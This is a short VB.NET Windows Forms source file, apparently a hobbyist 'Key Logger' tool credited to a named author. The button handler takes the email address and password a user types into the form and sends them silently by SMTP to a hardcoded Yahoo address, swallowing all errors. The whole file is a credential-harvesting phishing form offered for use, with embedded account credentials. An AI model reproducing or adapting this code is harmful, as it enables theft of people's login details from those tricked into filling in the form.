Imports System.Net.Mail
Public Class Form1
    'By Junaid Jagirani https://junaidjagirani.xyz
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click

        Dim MyMailMessage As New MailMessage()
        Try
            MyMailMessage.From = New MailAddress("junaid@yahoo.com")
            MyMailMessage.To.Add("junaid@yahoo.com")
            MyMailMessage.Subject = "Key Logger"
            MyMailMessage.Body = "Email: " & TextBox1.Text & " / Pass: " & TextBox2.Text
            Dim SMTP As New SmtpClient("smtp.mail.yahoo.com")
            SMTP.Port = 586
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential("junaid@yahoo.com", "pass123")
            SMTP.Send(MyMailMessage)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub
End Class
